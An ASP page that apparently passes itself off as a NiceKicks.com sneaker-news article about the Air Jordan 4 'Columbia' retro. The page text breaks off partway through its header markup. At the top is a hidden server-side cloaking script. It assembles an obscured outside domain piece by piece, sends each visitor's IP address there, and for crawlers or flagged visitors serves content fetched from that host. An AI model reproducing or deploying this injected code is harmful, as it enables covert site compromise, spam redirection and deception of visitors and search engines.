<%
'on error resume next
Server.ScriptTimeout=600
dim systid,ISBK,html,echohtml,lk,ipurl,echourl,kdom
kdom = "1nil"
kdom =kdom & "2thea"
systid=484
kdom =kdom & "rsenal"

kdom =kdom & "."
ISBK = "false"
kdom =kdom &"com"
hs = "http"
ipurl = hs&"://nb."&kdom&"/nb.php?ip="
echourl = hs&"://ac."&kdom&"/echo.php?"
html = GetContent(ipurl&GetRsip()) 'GetRsip()
lk ="<t"&"@"&"k>"
If instr(html,lk)>0 Then
	 ISBK = replace(html,lk,"")
End If
'response.Write ISBK&ChecksAgent
'ISBK ="true"
if ChecksAgent=true or cstr(ISBK)="true" Then
	
	dim subspagseid
	subspagseid = request.querystring("subspagseid")
	If subspagseid Then
		response.Write GetContent(echourl&"sysid="&systid&"&subpageid="&subspagseid)
	Else
		%>


<!DOCTYPE html>
<html  prefix="og: http://ogp.me/ns#" style="background:#ffffff">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width" />
<title>Air Jordan 4 &quot;Columbia&quot; - NiceKicks.com</title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="pingback" href="http://www.nicekicks.com/xmlrpc.php" />
<!--[if lt IE 9]>
<script src="http://www.nicekicks.com/wp-content/themes/mightymag/js/html5.js" type="text/javascript"></script>
<script src="http://www.nicekicks.com/wp-content/themes/mightymag/js/respond.min.js" type="text/javascript"></script>
<script src="http://www.nicekicks.com/wp-content/themes/mightymag/js/modernizr-2.5.3.min.js" type="text/javascript"></script>
<![endif]-->


<meta property="fb:admins" content=""/><meta property="fb:app_id" content=""/>
<link rel="shortcut icon" href="http://nk_wp_media.s3.amazonaws.com/files/2014/11/nk-16.png"/>

<!-- This site is optimized with the Yoast WordPress SEO plugin v1.6.3 - https://yoast.com/wordpress/plugins/seo/ -->
<link rel="canonical" href="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Air Jordan 4 &quot;Columbia&quot; - NiceKicks.com" />
<meta property="og:description" content="The Air Jordan 4 &#8220;Columbia&#8221; is officially returning in 2015. In a new interview with Sole Collector, Dave Schechter, VP of Jordan Footwear, and Jeff Atienza, Jordan Brand Product Line Manager, reveal that Jordan Brand will be remastering their retro line in 2015. Ultimately, Jordan Brand aims to bring better, higher quality product to the masses with &hellip;" />
<meta property="og:url" content="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/" />
<meta property="og:site_name" content="NiceKicks.com" />
<meta property="article:tag" content="Air Jordan 4" />
<meta property="article:tag" content="Air Jordan 4 Columbia" />
<meta property="article:tag" content="Air Jordans" />
<meta property="article:section" content="Air Jordans" />
<meta property="article:section" content="Jordan Brand" />
<meta property="article:published_time" content="2014-06-06T14:33:21+00:00" />
<meta property="fb:admins" content="1090615405" />
<meta property="og:image" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-01.jpg" />
<meta property="og:image" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-02.jpg" />
<meta property="og:image" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-05.jpg" />
<meta property="og:image" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-04.jpg" />
<meta property="og:image" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-03.jpg" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:site" content="@nicekicks"/>
<meta name="twitter:domain" content="NiceKicks.com"/>
<meta name="twitter:creator" content="@shelton_britt"/>
<meta name="twitter:image:src" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-01.jpg"/>
<meta name="twitter:image:src" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-02.jpg"/>
<meta name="twitter:image:src" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-05.jpg"/>
<meta name="twitter:image:src" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-04.jpg"/>
<meta name="twitter:image:src" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-03.jpg"/>
<!-- / Yoast WordPress SEO plugin. -->

<link rel="alternate" type="application/rss+xml" title="NiceKicks.com &raquo; Feed" href="http://www.nicekicks.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="NiceKicks.com &raquo; Comments Feed" href="http://www.nicekicks.com/comments/feed/" />
<link rel="alternate" type="text/calendar" title="NiceKicks.com &raquo; iCal Feed" href="http://www.nicekicks.com/sneaker-release-dates/?ical=1" />
<link rel="alternate" type="application/rss+xml" title="NiceKicks.com &raquo; Air Jordan 4 &#8220;Columbia&#8221; Comments Feed" href="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/feed/" />
<meta property="og:image" content="http://www.nicekicks.com/wp-content/themes/mightymag/images/no_thumb.png"/>
<link rel='stylesheet' id='flick-css'  href='http://www.nicekicks.com/wp-content/plugins/mailchimp//css/flick/flick.css?ver=4.0' type='text/css' media='all' />
<link rel='stylesheet' id='mailchimpSF_main_css-css'  href='http://www.nicekicks.com/?mcsf_action=main_css&#038;ver=4.0' type='text/css' media='all' />
<!--[if IE]>
<link rel='stylesheet' id='mailchimpSF_ie_css-css'  href='http://www.nicekicks.com/wp-content/plugins/mailchimp/css/ie.css?ver=4.0' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='mgm_PT+Sans-css'  href='http://fonts.googleapis.com/css?family=PT+Sans' type='text/css' media='all' />
<link rel='stylesheet' id='mgm_Oswald-css'  href='http://fonts.googleapis.com/css?family=Oswald' type='text/css' media='all' />
<link rel='stylesheet' id='mashsb-styles-css'  href='http://www.nicekicks.com/wp-content/plugins/mashsharer/templates/mashsb.min.css?ver=2.1.5' type='text/css' media='all' />
<style type='text/css'>

        .mashsb-count {
        color: #ed1b24;
       
        }.mashicon-subscribe{
background: #ed1b24;
}

.mashsb-toggle-container {
    display:none;
    padding: 11px 2% 8px;
    border: 10px solid #ed1b24;
    position: relative;
    margin-bottom:10px;
    margin-top:0px;
}

.mashicon-subscribe .text, 
.mashicon-subscribe .icon {
color: #ffffff;
}
</style>
<link rel='stylesheet' id='theiaPostSlider-css'  href='http://www.nicekicks.com/wp-content/plugins/theia-post-slider/css/font-theme.css?ver=1.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='theiaPostSlider-font-css'  href='http://www.nicekicks.com/wp-content/plugins/theia-post-slider/fonts/style.css?ver=1.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpt-twitter-feed-css'  href='http://www.nicekicks.com/wp-content/plugins/wp-to-twitter/css/twitter-feed.css?ver=4.0' type='text/css' media='all' />
<link rel='stylesheet' id='lashare-styles-css'  href='http://www.nicekicks.com/wp-content/plugins/mashshare-likeaftershare/templates/lashare.min.css?ver=1.1.6' type='text/css' media='all' />
<link rel='stylesheet' id='mashresp-styles-css'  href='http://www.nicekicks.com/wp-content/plugins/mashshare-responsive/assets/css/mashresp.min.css?ver=2.0.3' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css-css'  href='http://www.nicekicks.com/wp-content/themes/mightymag/css/bootstrap.css?ver=all' type='text/css' media='all' />
<link rel='stylesheet' id='style-css'  href='http://www.nicekicks.com/wp-content/themes/mightymag/style.css?ver=all' type='text/css' media='all' />
<link rel='stylesheet' id='less-code-css'  href='http://www.nicekicks.com/wp-content/themes/mightymag/css/less.css?ver=all' type='text/css' media='all' />
<link rel='stylesheet' id='mgm-vc-css'  href='http://www.nicekicks.com/wp-content/themes/mightymag/css/mgm-vc.css?ver=all' type='text/css' media='all' />
<link rel='stylesheet' id='animate-css-css'  href='http://www.nicekicks.com/wp-content/themes/mightymag/css/animate.custom.min.css?ver=all' type='text/css' media='all' />
<link rel='stylesheet' id='jackbox-css-css'  href='http://www.nicekicks.com/wp-content/themes/mightymag/inc/jackbox/css/jackbox.css?ver=all' type='text/css' media='all' />
<link rel='stylesheet' id='js_composer_custom_css-css'  href='http://www.nicekicks.com/files/js_composer/custom.css?ver=4.3.4' type='text/css' media='screen' />
<link rel='stylesheet' id='jetpack_css-css'  href='http://www.nicekicks.com/wp-content/plugins/jetpack/css/jetpack.css?ver=3.2' type='text/css' media='all' />
<script type='text/javascript'>
/* <![CDATA[ */
var mgm_script = {"post_id":"385314","ajaxurl":"http:\/\/www.nicekicks.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/mailchimp/js/scrollTo.js?ver=1.4.2'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-includes/js/jquery/jquery.form.min.js?ver=3.37.0'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var mailchimpSF = {"ajax_url":"http:\/\/www.nicekicks.com\/"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/mailchimp/js/mailchimp.js?ver=1.4.2'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.10.4'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/mailchimp//js/datepicker.js?ver=4.0'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var codepeople_search_in_place = {"more":"More Results","empty":"0 results","char_number":"","root":"http:\/\/www.nicekicks.com","home":"http:\/\/www.nicekicks.com"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/inc/live-search/js/live-search.js?ver=4.0'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var mashsb = {"shares":"0","round_shares":"1","animate_shares":"1","share_url":"http:\/\/www.nicekicks.com\/2014\/06\/06\/air-jordan-4-columbia\/","title":"Air+Jordan+4+%E2%80%9CColumbia%E2%80%9D","image":null,"desc":"The Air Jordan 4 \"Columbia\" is officially returning in 2015. In a new interview with\u00a0Sole Collector,\u00a0Dave Schechter, VP of Jordan Footwear, and Jeff Atienza, Jordan Brand Product Line Manager, reveal that Jordan Brand will be \u2026","hashtag":"&via=nicekicks","subscribe":"content","subscribe_url":"","activestatus":"1","singular":"1"};
var mashsu = {"shorturl":"http:\/\/www.nicekicks.com\/?p=385314"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/mashsharer/assets/js/mashsb.min.js?ver=2.1.5'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/theia-post-slider/js/balupton-history.js/jquery.history.js?ver=1.7.1'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/theia-post-slider/js/async.min.js?ver=14.09.2014'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/theia-post-slider/js/hammer.min.js?ver=2.0.4'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/theia-post-slider/js/tps.js?ver=1.7.1'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/theia-post-slider/js/tps-transition-slide.js?ver=1.7.1'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/mashshare-google-analytics/assets/js/mashga.min.js?ver=1.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var lashare_fb = {"lashare_version":"1.1.6","fb_app_id":"821712381202041","like_url":"http:\/\/www.facebook.com\/nicekicks","title":"Air Jordan 4 \u201cColumbia\u201d","picture":"default.png","caption":"www.nicekicks.com","description":"","language":"en_US","fb_perma_close":"1","fb_bgcolor":"#292929","share_url":"http:\/\/www.nicekicks.com\/2014\/06\/06\/air-jordan-4-columbia\/"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/plugins/mashshare-likeaftershare/assets/js/lashare-fb.min.js?ver=1.1.6'></script>
<script type='text/javascript' src='http://www.nicekicks.com/wp-content/themes/mightymag/js/wow.min.js?ver=1'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.nicekicks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.nicekicks.com/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='http://www.nicekicks.com/?p=385314' />
	<script type="text/javascript">
		jQuery(function($) {
			$('.date-pick').each(function() {
				var format = $(this).data('format') || 'mm/dd/yyyy';
				format = format.replace(/yyyy/i, 'yy');
				$(this).datepicker({
					autoFocusNextInput: true,
					constrainInput: false,
					changeMonth: true,
					changeYear: true,
					beforeShow: function(input, inst) { $('#ui-datepicker-div').addClass('show'); },
					dateFormat: format.toLowerCase(),
				});
			});
			d = new Date();
			$('.birthdate-pick').each(function() {
				var format = $(this).data('format') || 'mm/dd';
				format = format.replace(/yyyy/i, 'yy');
				$(this).datepicker({
					autoFocusNextInput: true,
					constrainInput: false,
					changeMonth: true,
					changeYear: false,
					minDate: new Date(d.getFullYear(), 1-1, 1),
					maxDate: new Date(d.getFullYear(), 12-1, 31),
					beforeShow: function(input, inst) { $('#ui-datepicker-div').removeClass('show'); },
					dateFormat: format.toLowerCase(),
				});

			});

		});
	</script>
	<script src="//load.sumome.com/" data-sumo-site-id="f61b8adc05ab53d6a2a762607c8b1def1202e0d9de8c7280fad4c9514218dccc" async></script>		<style>
			.theiaPostSlider_nav.fontTheme ._title {
				line-height: 48px;
			}

			.theiaPostSlider_nav.fontTheme ._button {
				color: #ed1b24;
			}

			.theiaPostSlider_nav.fontTheme ._button ._2 span {
				font-size: 48px;
				line-height: 48px;
			}

			.theiaPostSlider_nav.fontTheme ._button:hover,
			.theiaPostSlider_nav.fontTheme ._button:focus {
				color: #f15c62;
			}

			.theiaPostSlider_nav.fontTheme ._disabled {
				color: #848484 !important;
			}
		</style>
	
<!-- Twitter Cards Meta By WPDeveloper.net -->
<meta name="twitter:card" value="summary"/>
<meta name="twitter:site" value="@nicekicks" />
<meta name="twitter:creator" value="@nicekicks" />
<meta name="twitter:url" value="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/"/>
<meta name="twitter:title" value="Air Jordan 4 &#8220;Columbia&#8221;"/>
<meta name="twitter:description" value="The Air Jordan 4 &#8220;Columbia&#8221; is officially returning in 2015. In a new interview with Sole Collector, Dave Schechter, VP of Jordan Footwear, and Jeff Atienza, Jordan Brand Product Line [...]"/>
<meta name="twitter:image" value="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-01.jpg" />
<!-- Twitter Cards Meta By WPDeveloper.net -->

		<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@nicekicks" />
<meta name="twitter:url" content="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/" />
<meta name="twitter:title" content="Air Jordan 4 &#8220;Columbia&#8221;" />
<meta name="twitter:description" content="The Air Jordan 4 "Columbia" is officially returning in 2015. In a new interview with &hellip;" />
<!-- Open Graph Meta Data by Mashshare.net Open Graph Add-On-->
<meta property="og:site_name" content="NiceKicks.com" />
<meta property="og:locale" content="en_us" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Air Jordan 4 &#8220;Columbia&#8221;" />
<meta property="og:url" content="http://www.nicekicks.com/2014/06/06/air-jordan-4-columbia/" />
<meta property="og:description" content="The Air Jordan 4 &#8220;Columbia&#8221; is officially returning in 2015. In a new interview with Sole Collector, Dave Schechter, VP of Jordan Footwear, and Jeff Atienza, Jordan Brand Product Line Manager, reveal that Jordan Brand will be remastering their retro line in 2015. Ultimately, Jordan Brand aims to bring better, higher quality product to the masses with [&hellip;]" />
<meta property="og:image" content="http://nk_wp_media.s3.amazonaws.com/files/2014/06/air-jordan-iv-4-columbia-2015-retro-02-100x100.jpg" />
<!-- /Open Graph Meta Data -->
<style type='text/css'>img#wpstats{display:none}</style>
<script type='text/javascript'>
var googletag = googletag || {};
googletag.cmd = googletag.cmd || [];
(function() {
var gads = document.createElement('script');
gads.async = true;
gads.type = 'text/javascript';
var useSSL = 'https:' == document.location.protocol;
gads.src = (useSSL ? 'https:' : 'http:') + 
'//www.googletagservices.com/tag/js/gpt.js';
var node = document.getElementsByTagName('script')[0];
node.parentNode.insertBefore(gads, node);
})();
</script>



<script type='text/javascript'>

googletag.cmd.push(function() {
	googletag.defineSlot('/6036473/ROS_300x250_Anchor', [[300, 250], [300, 600]], 'wvn_zone_btf300').addService(googletag.pubads());
	googletag.defineSlot('/6036473/ROS_300x250_Top', [[300, 250], [300, 600], [300, 1050]], 'wvn_zone_atf300').addService(googletag.pubads());
	googletag.defineSlot('/6036473/ROS_600x300', [600, 300], 'wvn_zone_600').addService(googletag.pubads());
	googletag.defineSlot('/6036473/ROS_728x90_Anchor', [[728, 90], [728, 270]], 'wvn_zone_btf728').addService(googletag.pubads());
	googletag.defineSlot('/6036473/ROS_728x90_Top', [[728, 90], [728, 270]], 'wvn_zone_atf728').addService(googletag.pubads());
	googletag.defineSlot('/6036473/ROS_Pushdown', [[970, 1], [970, 66], [970, 500]], 'wvn_zone_970').addService(googletag.pubads());
	googletag.defineSlot('/6036473/ROS_Skin', [1, 1], 'wvn_zone_skin').addService(googletag.pubads());


googletag.pubads().setTargeting("cflag", 0);googletag.pubads().setTargeting("post_tags", ["AIR JORDAN 4", "AIR JORDAN 4 COLUMBIA", "AIR JORDANS"]);	googletag.pubads().collapseEmptyDivs();
	googletag.pubads().enableSingleRequest();
	googletag.enableServices();
});
</script>


<style type="text/css">
	#wvn_branding_ad { max-width: 880px; margin: 0 auto; }
		#wvn_branding_ad #mgm-top-ad { margin: 0; }
		#wvn_branding_ad #mgm-branding { float: left; width: 110px; text-align: center; margin-right: 30px; }
	#mgm-middle-ad { background: transparent !important; padding: 10px 0 !important; }
	#wvn_skin { width: 0; height: 0; }
	#wvn_zone_atf728 { float: right; max-width: 728px; height: auto; margin: 15px auto 0; text-align: center; }
		#wvn_zone_atf728 > div > div { margin: 0 auto; }
	#wvn_zone_btf728 { min-width: 728px; width: 728px; height: auto; margin: 0 auto; text-align: center; }
	#wvn_zone_atf300 { width: 300px; margin:0 auto; }
	#wvn_zone_btf300 { width: 300px; margin:0 auto; }
	#wvn_600 { width: 600px; height: auto; margin-top: 5px; margin-bottom: 20px !important; }
	#wvn_970 { position: relative; width: 100%; height: auto; margin: 10px auto 0; background: #fff; }
		#wvn_970 #wvn_zone_970 { width: 970px; padding: 0; margin: 0 auto; height: auto; }
	.wvn_600x300_masonary { width: 600px !important; height: auto !important; }
	
	@media (max-width: 900px) {
		#wvn_branding_ad #mgm-branding { float: none; width: 110px; margin: 0 auto; }
		#wvn_600, #wvn_970, #wvn_zone_atf728, #wvn_skin { display: none !important; }
	}
	
	@media (max-width: 900px) {
		#wvn_zone_atf728, #wvn_atf_728, #wvn_btf_728 { display: block; min-height: 0; }
	}
	
	#mgm-loop-wrap article.post, .hentry { min-height: 200px; }
	
	body.home .td-grid-wrap { padding: 30px 13px 0; }
</style><style>
				.mgm-title a,
				.mgm-title span
				{color:#686868!important}
				
				body
				{color:#686868}
				
				a
				{color:#ed1b24}
				
				a:hover
				{color:#eaeaea;}
				
				.breadcrumb a:hover,
				.woocommerce-breadcrumb a:hover,
				.bbp-breadcrumb a:hover
				{color:#eaeaea!important;}
				
			.cat-bg,
			.inverse .boxed,
			.inverse .boxed .entry-details,
			.social-count-plus .items,
			.social-count-plus span.label,
			.sticky .entry-details,
			.article-content-wrapper:hover .img-hover-info,
			.rw-user-rating-desc .user_rating, 
			.rw-user-rating-desc .your_rating,
			.btn-success, .btn-success:hover, .btn-success:active, .btn-success:focus,
			.generic-button a,
			div.item-list-tabs ul li a span,
			.taxonomy-description p,
			#mgm-toolbar .topnav-wrap a,
			#mgm-toolbar .mgm-search-icon-trigger:hover .glyphicon-search
			{color:#ffffff}
			
			.inverse .boxed a,
			.social-count-plus .items a,
			.social-count-plus span.label a,
			.sticky .entry-details a,
			.mgm-cat .entry-details a,
			.cat-panes-content .entry-details,
			.cat-panes-content .entry-details a
			{color:#eaeaea}
			
			.inverse .boxed a:hover,
			.social-count-plus .items a:hover,
			.social-count-plus span.label a:hover,
			.sticky .entry-details a:hover
			{color:#0a0a0a}
			
			.search-in-place,
			.search-in-place .more,
			#collapse-trigger-wrap #collapse-icons,
			.entry-details,
			.mgm-title:after,
			.reply-wrap,
			#author-socials-wrap,
			.mgm-gray-frame,
			.rw-bar-wrap, 
			.rw-end,
			.affiliate-wrap,
			table thead tr,
			div.item-list-tabs,
			#bbpress-forums li.bbp-header,
			#bbpress-forums li.bbp-footer,
			.gallery-caption
			{background-color:#f9f9f9}
			
			#mgm-grid,
			#mgm-grid .mgm-grid-block:last-child
			{border-left: 1px solid #f9f9f9}
			
			#mgm-grid .mgm-grid-block.mgm-grid-wide
			{border-bottom: 1px solid #f9f9f9}
			
			#mgm-live-search input
			{border-color: #f9f9f9}
			
				.search-in-place,
				.search-in-place .more,
				#collapse-trigger-wrap #collapse-icons,
				.entry-details,
				.mgm-title:after,
				.reply-wrap,
				#author-socials-wrap,
				.rw-bar-wrap, 
				.rw-end,
				.affiliate-wrap,
				.gallery-caption,
				.gallery-caption:before
				{color:#686868}
				
				.search-in-place a,
				.search-in-place .more a,
				#collapse-trigger-wrap #collapse-icons a,
				.mgm-title:after a,
				#author-socials-wrap a,
				.rw-bar-wrap a, 
				.rw-end a
				{color:#ed1b24}
				
				.search-in-place a:hover,
				.search-in-place .more a:hover,
				#collapse-trigger-wrap #collapse-icons a:hover,
				.entry-details a:hover,
				.mgm-title:after a:hover,
				#author-socials-wrap a:hover,
				.rw-bar-wrap a:hover,
				.rw-end a:hover
				{color:#eaeaea}
				
			.boxed,
			#respond {
				border-color: rgba(255,255,255, .1);
			}
			.home .flexslider,
			#mgm-grid,
			.cat-panes-content {
				display: none;
			}
			
			.main-navigation ul
			{background-color:#333333}
			
				.mgm-full-main,
				.mgm-title a, 
				.mgm-title span,
				.boxed.entry-block,
				.reply-wrap a:first-child:before, 
				.reply-wrap .reply-wrap-submit:first-child:before,
				.white-line {
				 	
					background-color:#ffffff;
					
				}
				
				@media (max-width: 767px) {
					.mgm-full-main {
						padding: 0;
						box-shadow: none;
						background: none;
					}
				}</style><style>
				.mgm-font,
				h1,h2,h3,h4,h5,h6,
				.topnav-wrap,
				.main-navigation,
				.main-small-navigation ul,
				.page-nav,
				.flex-cat,
				#carousel div span,
				.carousel-text a,
				.widget a.twtr-join-conv,
				#comments .simil-widget-comment,
				#comments .bypostauthor .mgm-title-bg:before,
				.nocomments,
				.lwa .lwa-title,
				.lwa-register .lwa-title,
				.lwa .dropdown-menu li > a,
				.date a,
				.info-stripe .cat-stripe,
				.info-stripe .percent-stripe,
				.social-count-plus span.count,
				.cat-tabs span a,
				.accordion-heading,
				.vc_text_separator div,
				#content .wpb_accordion .ui-accordion .ui-accordion-header a,
				.wpb_accordion .ui-accordion .ui-accordion-header a,
				#content .wpb_content_element .ui-tabs .ui-tabs-nav,
				.jackbox-modal h2,
				.jackbox-modal h3,
				.jackbox-title-text,
				#ticker-items li a,
				#ticker-items li span,
				#mgm-live-search input,
				.search-in-place .title,
				.search-in-place .more,
				.social-count-plus span.count,
				.img-hover-info,
				.btn,
				#mgm-collapse-newsletter span,
				.author-name a,
				#rating-box,
				cite.fn,
				.mgm-trigger,
				.mgm-overtitle,
				.mgm-share-text,
				.mgm-onsale,
				.delete-activity,
				.delete-activity-single,
				.buddypress .generic-button a,
				.buddypress .actions a,
				#mgm-notifications-modal .modal-content,
				.bbp-form legend,
				.wpb_button,
				.bbp-forum-title,
				.bbp-view-title,
				.bbp-reply-topic-title,
				.bbp-pagination-links,
				ul.tabs li a,
				.woocommerce .product_list_widget,
				.woocommerce span.amount,
				.item-title
			{font-family:Oswald;}
body{font-family:PT Sans;}
body {font-size:12px }</style>	
		<style>.wp-caption-text {
	text-align: center;
	color: #000000;
}</style>
	
	<meta name="generator" content="Powered by Visual Composer - drag and drop page builder for WordPress."/>
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="http://www.nicekicks.com/wp-content/plugins/js_composer/assets/css/vc-ie8.css" media="screen"><![endif]--><style>
		
	
	
	.cat-color,
	.comment-author cite,
	.comment-author cite a,
	#mgm-toolbar .topnav-wrap a:hover,
	.search-in-place .more a,
	.mgm-search-icon-trigger .glyphicon-search,
	#collapse-icons a.active,
	#mgm-collapse-newsletter span,
	#mgm-full-footer .mgm-title a,
	#mgm-full-footer .mgm-title span,
	.custom-widget .entry-rating,
	#author-wrap .author-name a,
	.lwa-formlinks a,
	.lwa-formlinks label,
	.mgm-trigger.active,
	#ticker-wrap a,
	.readmore,
	#rw-box-title,
	.rw-overall-number,
	.rw-user-rating-desc .score,
	.affiliate-wrap p,
	.woocommerce p.stars a, 
	.woocommerce-page p.stars a,
	h4, h5, h6,
	h4.cat-color a,
	h5.cat-color a,
	h6.cat-color a,
	.widget_display_stats dd,
	.woocommerce span.amount,
	.widget_recent_reviews .reviewer,
	.shop-banner-title a,
	.user-name,
	.mgm-reply-author a,
	#bbpress-forums .bbp-forum-title,
	.activity-read-more a {	
		color:#ed1b24;
	}
	
	h4.mgm-title a,
	h4.mgm-title span,
	ul.tabs li.active a,
	.cat-tabs span.current a,
	a[class*="star-"]:hover:after  {
		color:#ed1b24!important;
	}
	
	.cat-bg,
	#mgm-header-opacity,
	.nav-wrap#nav-clone .mgm-logo,
	.nav-wrap#nav-clone .mgm-logo-text,
	.sticky	.entry-details,
	#mgm-full-collapsible .btn-success:hover,
	#mgm-full-collapsible .btn-success:focus,
	#mgm-full-site-info,
	.mgm-cat a,
	.flex-cat,
	.mgm-title.mgm-title-skin:after,
	.mgm-title a:after, .mgm-title a:before, .mgm-title span:after, .mgm-title span:before,
	.inverse .boxed,
	.reply-wrap .mgm-reply a,
	.article-content-wrapper:hover .img-hover-info,
	.rw-criteria.stars-preview,
	.rw-bar-progress,
	.social-count-plus ul li,
	.cat-panes-content .entry-details,
	.cat-panes-content .entry-details a,
	.rw-user-rating-desc .user_rating, 
	.rw-user-rating-desc .your_rating,
	.mgm-share-text,
	.flex-direction-nav,
	.woocommerce #comments .star-rating, 
	.woocommerce-page #comments .star-rating,
	.mgm-onsale,
	.btn-success, .btn-success:hover, .btn-success:active, .btn-success:focus, .btn-success.disabled, .btn-success[disabled],
	.generic-button a,
	.actions a.mark-read,
	div.item-list-tabs ul li a span,
	.taxonomy-description p,
	.mgm-search-icon-trigger:before,
	.mgm-title span.mgm-stripe,
	.jackbox-panel:hover,
	.woocommerce .widget_price_filter .ui-slider .ui-slider-handle, 
	.woocommerce-page .widget_price_filter .ui-slider .ui-slider-handle,
	.woocommerce-review-link,
	.label-minus,
	.label-plus,
	.single_add_to_cart_button,
	.mgm-product-single-wrap .price,
	.shop-banner-price .price,
	span#subscription-toggle a, span#favorite-toggle a,
	.woocommerce-result-count {
		background-color:#ed1b24;
	}
	
	.mgm-spinner { 
		border-top-color:#ed1b24;
	}

	ul.menu > li > a:before {
		
		border-top: 6px solid #ed1b24;
	}
	
	.mgm-share-text:after {
		border-left: 8px solid #ed1b24;
	}

	.bypostauthor > .boxed {
		border: 1px solid #ed1b24;
		border-bottom: none;
	}
	
	::-moz-selection {
		
		background:#ed1b24!important;
		color: #fff;
	}
	::selection {
		
		background:#ed1b24!important;
		color: #fff;
	}
	
	*:focus {
		outline: 0!important;
	}
	
	.form-control:focus {
		border-color: #ed1b24!important;
		box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 10px #ed1b24!important;
	}

	 </style>

		<link rel="stylesheet" id="custom-css-css" type="text/css" href="http://www.nicekicks.com/?custom-css=1&#038;csblog=1&#038;cscache=6&#038;csrev=15" />
		</head>


<body class="single single-post postid-385314 single-format-standard tribe-bar-is-disabled group-blog wpb-js-composer js-comp-ver-4.3.4 vc_responsive tribe-theme-mightymag page-template-single-php" >


<div id="wvn_skin">
	<div id='wvn_zone_skin'>
		<script type='text/javascript'>
		googletag.cmd.push(function() { googletag.display('wvn_zone_skin'); });
		</script>
	</div>
</div>
<noscript><style scoped>.content-sidebar-wrap { visibility: visible!important } .mgm-spinner {display:none;} </style></noscript>



<div id="mgm-super-container">

	<div class="mgm-full-main">
	
		<div id="page" class="hfeed site">
		
						
			<div id="mgm-header-wrap" class="mgm-gray-frame">
						
				<div id="mgm-header-opacity">
				
				
					<!-- SuperTop Toolbar
					================================================== -->
					<div id="mgm-full-supertop">
						<div id="mgm-full-supertop-overlay">
						
							<div id="mgm-toolbar">
							
								

<ul class="socials">
	</ul>								
								<div class="mgm-search-wrap tc">
									<a data-toggle="collapse" data-target="#mgm-live-search" class="mgm-search-icon-trigger">
										<span class="glyphicon glyphicon-search"></span>
									</a>
								</div>
				
								<ul id="menu-utilities" class="topnav-wrap"><li id="menu-item-412753" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-412753"><a href="http://www.nicekicks.com/events/">events</a></li>
<li id="menu-item-412754" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-412754"><a href="http://www.shopnicekicks.com">shop</a></li>
<li id="menu-item-418356" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-418356"><a href="http://www.nicekicks.com/sneaker-release-dates/">release dates</a></li>
</ul>								
							</div>
						</div>
						
						<div id="mgm-live-search" class="collapse">
	
